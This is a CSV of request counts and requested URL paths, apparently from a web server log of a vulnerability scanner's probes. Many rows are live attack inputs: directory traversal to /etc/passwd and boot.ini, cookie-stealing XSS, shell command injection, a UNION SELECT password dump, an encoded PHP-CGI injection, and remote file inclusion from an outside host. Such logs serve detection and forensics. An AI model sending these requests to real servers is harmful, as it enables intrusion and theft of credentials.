Frequency,Resource
1,/cgi-bin/auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,virgil.cgi
1,/TvLBvkHh.asa
2,/upload/bank-icons/bank-gh.jpg
1,/cgi-bin/htmlscript?../../../../../../../../../../etc/passwd
1,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/servlet/org.apache.catalina.Globals/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/LWGate
1,"/cgi-bin/FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
2,/mysql-admin/index.php
1,/TvLBvkHh.asp
1,/index.htm
1,/scripts/tools/dsnform.exe
1,/504/
1,/exchange/lib/logon.inc
1,/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
1,/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
1,/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
1,/sip/
1,/mailman/listinfo/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
2,/cgi-bin/cgiwrap/~nuucp
1,/cgi-bin/websendmail
1,/vgn/login
1,/cgi-bin/blog/mt-load.cgi
1,/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1
1,/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.cp-1251
1,dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
1,/cgi-bin/pagelog.cgi
1,/cd-cgi/sscd_suncourier.pl
1,/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1
1,/admin/cplogfile.log
1,icat
1,/nsn/..%5Cutil/lancard.bas
5,/cgi-bin/MsmMask.exe?mask=/junk334
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.thtml
1,perlshop.cgi
1,cgicso?query=AAA
1,/exec/show/config/cr
1,/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>
1,/news/news.mdb
1,/webamil/test.php
1,/TvLBvkHh.cgi+
1,/forum/admin/database/wwForum.mdb
1,MsmMask.exe
1,/vgn/legacy/edit
1,/quikstore.cgi
1,//../../../../../../../../../../etc/passwd
1,"/administrator/upload.php?newbanner=1&choice=\""<script>alert(document.cookie)</script>"
1,/vendor/phpunit/phpunit/src/Util/Filter.php
1,/DomainFiles/*//../../../../../../../../../../etc/passwd
1,html2chtml.cgi
1,/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
1,/TvLBvkHh.nsconfig
1,/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
1,/cgi/cgiproc
1,/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>
1,/bb-dnbd/faxsurvey
1,/wp-includes/js/nri.exe
1,/freefpbf/
1,/clientaccesspolicy.xml
1,/TvLBvkHh.2
1,/TvLBvkHh.1
1,/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini
1,"/include.php?path=contact.php&contact_email=\"">&lt;script&gt;alert(document.cookie);&lt;/script&gt;"
1,/cgi-bin/foxweb.exe
1,/TvLBvkHh.*
1,/forums//admin/config.php
1,/typo3conf/database.sql
2,cgiwrap/~ftp
2,/admin/index.php
1,/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
1,/TvLBvkHh.SHOW
1,/%5BSecCheck%5D/../../ext.ini
1,/signon
1,/index.html.bak
1,diagnose.cgi
1,/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
1,/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
4,/robots.txt
1,/cgi-bin/rpm_query
1,/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/cgi-bin/snorkerz.cmd
1,commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/iisadmin/
1,/cgi-bin/listrec.pl
2,formmail.pl
1,/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter
1,/TvLBvkHh.shm
1,/TvLBvkHh.c
1,/cgi-bin/cgitest.exe
1,/TvLBvkHh._
1,/global.asa
2,/dbadmin/index.php
1,/html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
1,/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd
1,/nsn/..%5Cutil/slist.bas
1,/cgi-bin/uploader.exe
1,/cgi-bin/com5..........................................................................................................................................................................................................................box
1,/TvLBvkHh.PWD
1,/TvLBvkHh.showsource
1,/cgi-bin/bannereditor.cgi
1,/cgi-bin/html2chtml.cgi
1,/*.*
1,archie
1,/TvLBvkHh.stm
1,/CVS/Entries
1,search
1,/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/cgi-bin/LWGate.cgi
1,/firmware/
1,test-env
1,/winbox.png
1,story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,/%3Cscript%3Ealert(%22xss%22)%3C/script%3E/index.html
1,/nsn/..%5Cwebdemo/fdir.bas
1,/IlohaMail/blank.html
1,/cgi-bin/MachineInfo
1,/666%0A%0A%3Cscript%3Ealert('Vulnerable');%3C/script%3E666.jsp
1,start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
1,/TvLBvkHh.VALIDATE_STMT
1,/TvLBvkHh.de
2,/cgi-bin/cgiwrap/~nobody
1,/lpt9.xtp
1,/cfdocs/expeval/displayopenedfile.cfm
1,/..%5C..%5C..%5C..%5C..%5C..%5Ctemp%5Ctemp.class
1,/TvLBvkHh.dll
1,/vgn/jsp/metadataupdate
1,/cgi-bin/post-query
1,/cgi-bin/webfind.exe?keywords=01234567890123456789
1,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
1,/password.inc
5,/phpmyadmin/scripts/_setup.php
1,/cgi-bin/test-cgi.tcl
1,/msadc/samples/adctest.asp
1,SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/nsn/..%5Cutil/chkvol.bas
1,/TvLBvkHh.cfg
1,/sshome/
1,/pw/storemgr.pw
1,/TvLBvkHh.cfc
1,/TvLBvkHh.cfm
1,/TvLBvkHh.en
1,/cgi-bin/blog/mt.cfg
1,/forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,admin.cgi?list=../../../../../../../../../../etc/passwd
1,hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/vgn/jsp/style
1,/cgi-bin/cart32.exe
1,php.cgi?/etc/passwd
1,cgiwrap
1,/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
1,/cgi-bin/YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/../../../../../windows/win.ini
1,/cgi-bin/../abyss.conf
1,/vgn/asp/previewer
1,/webmail/horde/test.php
1,/profile.php?u=fL2ak4pL
1,generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,////./../.../boot.ini
1,/exchange/lib/AMPROPS.INC
1,mt-static/mt.cfg
1,/siteminder
1,/events4.nsf
1,bizdb1-search.cgi
2,/myadmin/scripts/setup.php
1,/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/voice/
1,/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>
1,/midicart.mdb
1,ssi//../../../../../../../etc/passwd
1,/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
1,/cgi-bin/plusmail
1,/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
1,/cgi-bin/db4web_c/dbdirNikto//etc/passwd
1,wconsole.dll
1,/cgi-bin/vpasswd.cgi
1,/cgi-bin/view-source
1,/cgi-bin/htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
1,/servlet/org.apache.catalina.ContainerServlet/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/index.html
3,http://httpheader.net/
1,/scripts/samples/search/queryhit.idq
1,ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,search.php?searchstring=<script>alert(document.cookie)</script>
1,/admentor/adminadmin.asp
1,/cgi-bin/bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
1,/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
4,/setup.php
2,cgiwrap/~sys
1,ImageFolio/admin/admin.cgi
2,/path/nw/article.php?id='
1,/splashAdmin.php
1,/servlet/webacc?User.html=noexist
1,cmd1.exe?/c+dir
1,/TvLBvkHh.printer
1,/c/winnt/system32/cmd.exe?/c+dir+/OG
1,/cgi-bin/whois.cgi?action=load&whois=%3Bid
1,/TvLBvkHh.list
1,/cgi-bin/perl?-v
1,/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.nsf
1,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
1,webplus.exe?about
1,/cgi-bin/ssi//../../../../../../../etc/passwd
1,/cgi-bin/virgil.cgi
1,stat.pl
1,/index.php?file=index.php
1,traffic.cgi?cfg=../../../../../../../../etc/passwd
1,vpasswd.cgi
1,/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
1,/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes
1,/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
1,/uploadx.asp
1,/SilverStream/Meta/Tables/?access-mode=text
1,/exchange/lib/JSROOT.INC
1,/cgi-bin/info2www
1,/prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/ammerum/
1,/index.jhtml
1,common/listrec.pl
1,/TvLBvkHh.htaccess
1,/cgi-bin/sbcgi/sitebuilder.cgi
2,/db/index.php
1,/cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/vgn/previewer
2,/mysqladmin/index.php
1,search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/TvLBvkHh.php
2,/hndUnblock.cgi
1,orders/orders.txt
1,/names.nsf
1,/scripts/iisadmin/ism.dll
1,/TvLBvkHh.rdf+destype=cache+desformat=PDF
3,/cgi-bin/cgiwrap/~root
1,/TvLBvkHh.log
1,/phpBB2/search.php?search_id=1\\
1,shopper.cgi?newpage=../../../../../../../../../../etc/passwd
1,/cgi-bin/input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/quikstore.cfg
1,/somethingnotthere.ida
1,/cplogfile.log
1,/index.cgi
2,/admin/mysql2/index.php
1,/index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search
1,/spa122/
1,/whatever.htr
1,/TvLBvkHh.pt-br
1,/TvLBvkHh.tw
1,hpnst.exe?c=p+i=SrvSystemInfo.html
1,/examples/jsp/snp/anything.snp
1,/cgis/
1,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
1,/index.php?download=/etc/passwd
2,/upload/bank-icons/bank_16.png
1,/cgi-bin/processit.pl
2,/x
1,/cgi-bin/mt-static/mt-check.cgi
1,gm-cplog.cgi
1,faxsurvey?cat%20/etc/passwd
1,/cgi-win/cgitest.exe
1,rpm_query
1,/panasonic/
2,cgiwrap/~lp
1,/cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/wx/s.dll?d=/boot.ini
1,architext_query.cgi
1,/%5BSecCheck%5D/..%255c..%255c../ext.ini
1,/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x
1,/SiteServer/Admin/commerce/foundation/domain.asp
1,/TvLBvkHh.sh
1,/VoIP/
1,/_vti_bin/shtml.exe
2,/cgi-bin/cgiwrap/~listen
1,/default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/TvLBvkHh.se
1,"/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/whateverdXHZ.html
2,/xampp/phpmyadmin/index.php
1,/a%5C.aspx
1,/cfdocs/snippets/gettempdirectory.cfm
1,/cgi-bin/data/fetch.php?page=
1,/webadmin.nsf
1,/forums//phpmyadmin/config.php
1,"/cgi-bin/athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,/TvLBvkHh.save
1,/cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/basilix/message-read.php3
5,/php-my-admin/scripts/setup.php
1,/uploadn.asp
1,/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
1,/vgn/ac/fsave
1,/RELEASE-NOTES.txt
1,betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/TvLBvkHh.properties
1,/852566C90012664F
1,db4web_c/dbdirname//etc/passwd
1,/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd
1,main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/cfdocs/snippets/viewexample.cfm
1,/home.asp
1,FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/PlcmSpIp/
1,/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
1,/cgi-bin/mgrqcgi
1,mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
1,/search/sqlqhit.asp
1,/vgn/vr/Editing
1,/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
1,/pbserver/pbserver.dll
3,cgiwrap/~root
1,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,/%25NETHOOD%25/
1,test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/TiVoConnect?Command=QueryServer
1,/db/users.dat
1,/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cfappman/index.cfm
1,"/administrator/gallery/gallery.php?directory=\""<script>alert(document.cookie)</script>"
1,/cersvr.nsf
1,wrap.cgi
1,aglimpse
1,/cgi-bin/webdist.cgi
1,/cgi-bin/mailnews.cgi
1,whois.cgi?action=load&whois=%3Bid
1,/scripts/proxy/w3proxy.dll
1,perl.exe?-v
1,/prov/
1,/statrep.nsf
1,/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?
1,/TvLBvkHh.box
1,/cgi-bin/stat.pl
1,/SilverStream
1,/../../../../../../../../../boot.ini
1,quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/pma/index.php
1,urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/TvLBvkHh.cnf
1,/moo
2,"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>"
1,webfind.exe?keywords=01234567890123456789
1,/cgi-bin/shtml.dll
1,/perl/-e%20print%20Hello
1,whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,index.js0x70
1,/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
1,/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
1,/cgi-bin/date
1,/cgibin/
1,/TvLBvkHh.fhp
1,"/downloads/pafiledb.php?action=rate&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/TvLBvkHh.Big5
1,/tree
5,/scripts/setup.php
1,/TvLBvkHh.
1,/TvLBvkHh/
1,/cgi-bin/AT-admin.cgi
2,/admin/PMA/index.php
1,/TvLBvkHh.access
1,bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
2,/mysql/index.php
1,/TvLBvkHh.inc+
1,formmail
1,/comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,DCShop/orders/orders.txt
1,/launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.exe
1,/webcart/orders/
1,/cgi-bin/icat
1,lwgate
1,/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
1,/cgi-bin/dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,uploader.exe
1,/cgi-exe/
1,/catinfo?<u><b>TESTING
1,/cgi-bin/viralator.cgi
2,/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/jigsaw/
1,/cgi-bin/com5.java
1,/user.php?op=userinfo&uname=<script>alert('hi');</script>
1,generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/aastra/
1,/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
1,//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,awstats/awstats.pl
1,gm-authors.cgi
1,/TvLBvkHh.cwr
1,/cgi-bin/fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/cgi-bin/admin/setup.cgi
1,wais.pl
2,cgiwrap/~daemon
1,/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
5,/phpMyAdmin/scripts/_setup.php
2,/getcfg.php
1,classifieds/index.cgi
1,/TvLBvkHh.nsfdeslo
1,/images
2,/download.php?op=viewdownload
1,/index.php?download=/windows/win.ini
1,/pccsmysqladm/incs/dbconnect.inc
1,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
1,flexform.cgi
1,/ISSamples/sqlqhit.asp
1,/examples/basic/servlet/HelloServlet
2,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
1,Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
1,/cgi-bin/cgiwrap/%3Cfont%20color=red%3E
1,/examples/servlet/TroubleShooter
1,/prd.i/pgen/
1,modules/vwar/admin/config.php
1,/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
1,/admin/config.php
1,/phpmyadmin/phpmyadmin/index.php
1,/uySJie59sZ
1,test-cgi?/*
1,/nsn/..%5Cutil/md.bas
1,/php/php.exe?c:\boot.ini
1,/TvLBvkHh.htpasswd
1,"/downloads/pafiledb.php?action=email&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,htsearch?exclude=%60/etc/passwd%60
1,/test.php%20
1,webdist.cgi?distloc=;cat%20/etc/passwd
1,/vgn/jsp/jspstatus
2,cgiwrap/~bin
2,cgiwrap/~listen
1,/setup.nsf
1,/cgi-bin/SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/chat/!pwds.txt
1,/cgi-bin/cachemgr.cgi
1,/cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,/author.asp
1,/default.aspx
1,/web-console/ServerInfo.jsp%00
1,"/ca000007.pl?ACTION=SHOWCART&REFPAGE=\""><script>alert('Vulnerable')</script>"
1,/cbms/cbmsfoot.php
1,/index.cfm
1,/nsn/..%5Cutil/copy.bas
1,/provision/
1,htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
5,/phpMyAdmin2/scripts/setup.php
1,/servlet/org.apache.catalina.Context/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/vvx500/
2,/www/phpMyAdmin/index.php
1,/cgi-bin/fom.cgi?file=<script>alert('Vulnerable')</script>
1,"/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
1,/ht_root/wwwroot/-/local/httpd$map.conf
1,.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/cgi-bin/cgiwrap
1,/cgi-bin/campas?%0acat%0a/etc/passwd%0a
1,//cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
1,calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/nsn/..%5Cutil/dir.bas
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/webcart/orders/import.txt
1,/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
1,/ariadne/
1,/unauthenticated/provisioning/
1,/................../etc/passwd
1,/junk988.aspx
1,/wa.exe
1,html2wml.cgi
2,/claroline/phpMyAdmin/index.php
1,sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00
1,/TvLBvkHh.db
1,/help.html
1,/cgi-bin/WS_FTP.ini
2,/index.asp
1,/cfdocs/expeval/sendmail.cfm
1,LWGate
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
1,/forums//adm/config.php
2,cgiwrap/~adm
1,/cgi-bin/scoadminreg.cgi
1,"sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,/cgi-bin/MsmMask.exe
1,/dms/
2,/web/phpMyAdmin/index.php
1,/vgn/style
1,/cgi-bin/view-source?view-source
1,/cgi-bin/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
2,/admin/phpmyadmin2/index.php
1,spin_client.cgi?aaaaaaaa
1,/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
1,/index.php?sql_debug=1
1,/cisco/
143,index.html
1,ezboard.cgi
1,/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd
2,/hostadmin/?page='
1,/recordings/theme/iefixes.css
1,/TvLBvkHh.dtd
1,/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>
1,/vgn/license
1,/cgi-bin/com5.pl
1,view-source?view-source
1,/basilix/mbox-list.php3
1,//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/basilix/compose-attach.php3
1,/securecontrolpanel/
1,/cgi-bin/mt-static/mt-load.cgi
1,/polycomvvx/
1,/vgn/asp/MetaDataUpdate
1,/ws_ftp.ini
1,/html/cgi-bin/cgicso?query=AAA
1,publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,/ows-bin/
1,/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
1,/scripts/db4web_c.exe/dbdirname/c:%5Cboot.ini
1,/interscan/
1,/forum/admin/wwforum.mdb
1,search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('Vulnerable')</script>
1,fom.cgi?file=<script>alert('Vulnerable')</script>
1,/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.LCDispatcher
1,/index.php?|=../../../../../../../../../etc/passwd
1,/cgi-bin/cgiwrap/~ZA3Z1
1,/TvLBvkHh.render_css
1,/TvLBvkHh.orig
1,faqmanager.cgi?toc=/etc/passwd%00
1,/scozbook/view.php?PG=whatever
1,/cgi-bin/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.blt
1,finger
1,/.cobalt/sysManage/../admin/.htaccess
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx?aspxerrorpath=null
1,/w-agora/
1,/TvLBvkHh.et
1,/TvLBvkHh.nlm
1,/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html
1,/TvLBvkHh.es
1,/SIPCfg
1,/TvLBvkHh.txt
1,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
1,/phprov/
1,/phpmyadmin
1,/TvLBvkHh.sqlite
2,/%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/WS_FTP.ini
1,/search/SQLQHit.asp
1,mgrqcgi
1,/cgi-bin/ezman.cgi
1,generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/DB4Web/10.10.10.10:100
1,book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
1,/TvLBvkHh.iso8859-2
1,/TvLBvkHh.vts
1,/TvLBvkHh.iso8859-8
1,"sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
2,cgiwrap/~mysql
1,/cgi-bin/download.cgi
2,/cgi-bin/cgiwrap/~noaccess
1,admin/setup.cgi
1,/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/config/
1,/newuser?Image=../../database/rbsserv.mdb
1,/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1
1,/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
1,/TvLBvkHh.xbb
1,multihtml.pl?multi=/etc/passwd%00html
1,"/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/kboard/
1,/hmstat.htm
1,/cgi-bin/dcshop/orders/orders.txt
1,update.dpgs
1,/PMA2/index.php
1,"viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,/cgi-bin/htgrep?file=index.html&hdr=/etc/passwd
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,/502/
1,technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,/TvLBvkHh.ee
1,bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/php/php.exe?c:\winnt\boot.ini
1,/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.iso2022-jp
1,/cgi-bin/csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/TvLBvkHh.phpp
1,/cgi-bin/lwgate.cgi
1,.
1,/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/webmail/
1,"/index.php?file=Liens&op=\""><script>alert('Vulnerable');</script>"
1,/ISSamples/SQLQHit.asp
1,/pafiledb/includes/team/file.php
1,/cgi-bin/emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/cgi-bin/redirect
